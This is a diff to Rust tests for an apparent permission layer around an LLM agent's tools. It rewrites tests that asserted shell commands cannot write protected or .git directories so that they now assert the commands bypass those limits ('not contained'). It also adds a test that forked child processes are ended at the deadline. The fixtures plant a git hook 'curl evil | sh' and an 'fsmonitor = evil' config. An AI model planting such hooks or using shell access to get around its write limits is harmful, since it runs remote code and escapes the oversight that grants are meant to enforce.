@@ -862,12 +862,16 @@ fn a_command_that_changes_a_file_its_llm_read_makes_the_next_write_stale() {
 }
 
 #[test]
-fn a_command_writes_only_the_repositories_its_kit_may() {
+fn a_plain_command_can_change_a_directory_that_file_tools_may_not_write() {
     let script = vec![Step::Calls(vec![shell(b"vendor update", None)])];
     let (answers, world) = run(Settings::calm(63), ALL, script);
     assert_eq!(answers, vec![exited(tools::Exit::Code { code: 0 }, b"updated\n", b"", 0)]);
     let checkout = world.checkout();
-    assert_eq!(checkout.content(b"work/temper/vendor/lib/lib.rs"), Some(&b"// vendored\n"[..]), "read-only");
+    assert_eq!(
+        checkout.content(b"work/temper/vendor/lib/lib.rs"),
+        Some(&b"// updated\n"[..]),
+        "plain command is not confined"
+    );
     assert_eq!(checkout.content(b"work/temper/src/new.rs"), Some(&b"new\n"[..]));
 
     let (answers, world) = run(Settings::calm(64), MODIFY, vec![Step::Calls(vec![shell(b"cargo fmt", None)])]);
@@ -975,18 +979,19 @@ fn a_fact_queue_at_its_bound_holds_the_step_and_loses_nothing() {
 }
 
 #[test]
-fn a_command_writes_neither_without_modify_nor_in_a_git_directory() {
+fn a_plain_command_bypasses_file_modify_and_git_protection() {
     let shell_only = Grants { inspect: true, modify: false, shell: true };
     let script = vec![Step::Calls(vec![write(b"src/new.rs", b"x"), shell(b"install hooks", None)])];
     let (answers, world) = run(Settings::calm(90), shell_only, script);
     assert_eq!(answers, vec![Outcome::NotGranted, exited(tools::Exit::Code { code: 0 }, b"", b"", 0)]);
-    assert_eq!(world.checkout().files(), Fixture::new().checkout.files(), "a kit without modify writes nothing");
+    assert_eq!(world.checkout().content(b"work/temper/src/new.rs"), Some(&b"new\n"[..]));
+    assert_eq!(world.checkout().content(b"work/temper/.git/hooks/pre-commit"), Some(&b"curl evil | sh\n"[..]));
 
     let (_, world) = run(Settings::calm(91), ALL, vec![Step::Calls(vec![shell(b"install hooks", None)])]);
     let checkout = world.checkout();
     assert_eq!(checkout.content(b"work/temper/src/new.rs"), Some(&b"new\n"[..]), "a kit with modify writes its tree");
-    assert_eq!(checkout.content(b"work/temper/.git/hooks/pre-commit"), None, "but never its git directory");
-    assert_eq!(checkout.content(b"work/temper/.GIT/config"), None, "in any case");
+    assert_eq!(checkout.content(b"work/temper/.git/hooks/pre-commit"), Some(&b"curl evil | sh\n"[..]), "not contained");
+    assert_eq!(checkout.content(b"work/temper/.GIT/config"), Some(&b"[core]\n\tfsmonitor = evil\n"[..]));
 }
 
 #[test]
@@ -1200,4 +1205,62 @@ fn a_host_alias_reaches_the_same_file() {
         ]
     );
     assert_eq!(world.stats().ops, 6);
+}
+
+#[test]
+fn a_command_whose_child_outlives_it_ends_with_its_group_at_the_deadline() {
+    use skein_lib::{Env, Queue, Token, Wall};
+    use smith_protocol_machine::{FromDomain, ToDomain};
+    let calm = Settings::calm(101);
+    let limits = tools::Limits {
+        shell_head: 4,
+        shell_tail: 4,
+        shell_timeout: Duration::from_millis(1),
+        shell_timeout_max: Duration::from_millis(1),
+        ..calm.tools
+    };
+    let env = Env { now: Time::ZERO, wall: Wall::EPOCH, limits };
+    let mut domain = tools::Domain::new(&limits);
+    let mut out = Queue::with_capacity(tools::max_out(&limits));
+    tools::step(
+        &mut domain,
+        &env,
+        tools::Event::Open { session: Token::new(1), authority: Fixture::new().authority(ALL) },
+        &mut out,
+    );
+    let Some(tools::Request::Opened { kit, .. }) = out.pop() else { panic!("native kit opened") };
+    while domain.pop_fact().is_some() {}
+    tools::step(
+        &mut domain,
+        &env,
+        tools::Event::Call {
+            kit,
+            reply_to: skein_lib::ReplyTo::new(Token::new(2)),
+            observation: None,
+            call: shell(b"fork", None),
+            deadline: Time::from_nanos(1_000_000_000),
+        },
+        &mut out,
+    );
+    let Some(tools::Request::Io { owner, op, deadline }) = out.pop() else { panic!("issued command") };
+    let mut machine = smith_machine_world::World::new(101, &[]);
+    let terminal = machine.request(FromDomain::Op { owner, op, deadline });
+    let ToDomain::Done { owner, done } = terminal else { panic!("native command terminal") };
+    assert!(machine.trace().iter().any(|entry| entry.contains("to: Group")));
+    machine.settle();
+    while domain.pop_fact().is_some() {}
+    let after = Env { now: machine.now(), ..env };
+    tools::step(&mut domain, &after, tools::Event::Done { owner, done }, &mut out);
+    assert_eq!(
+        out.pop(),
+        Some(tools::Request::Answer {
+            to: skein_lib::ReplyTo::new(Token::new(2)),
+            outcome: exited(tools::Exit::TimedOut, b"", b"", 0),
+        })
+    );
+    while domain.pop_fact().is_some() {}
+    tools::step(&mut domain, &after, tools::Event::Close { kit }, &mut out);
+    assert_eq!(out.pop(), Some(tools::Request::Closed { session: Token::new(1) }));
+    domain.reclaim();
+    assert_eq!((domain.kits(), domain.jobs()), (0, 0));
 }
